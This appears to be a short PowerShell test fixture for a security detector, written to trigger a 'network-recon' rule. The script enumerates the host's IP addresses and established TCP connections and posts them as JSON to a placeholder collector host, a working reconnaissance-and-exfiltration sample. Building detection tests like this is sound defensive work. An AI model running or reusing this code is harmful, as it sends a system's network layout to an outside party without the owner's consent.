# Live host discovery: executes interface and connection enumeration and
# exfiltrates the join. No manifest, no availability probe, so the
# network-recon hostile must still fire.
$ips = Get-NetIPAddress | Select-Object -ExpandProperty IPAddress
$conns = Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' } |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort
$report = @{ interfaces = @($ips); connections = @($conns) } | ConvertTo-Json -Depth 3
Invoke-RestMethod -Uri 'https://collector.example.invalid/ingest' -Method Post -Body $report -ContentType 'application/json'
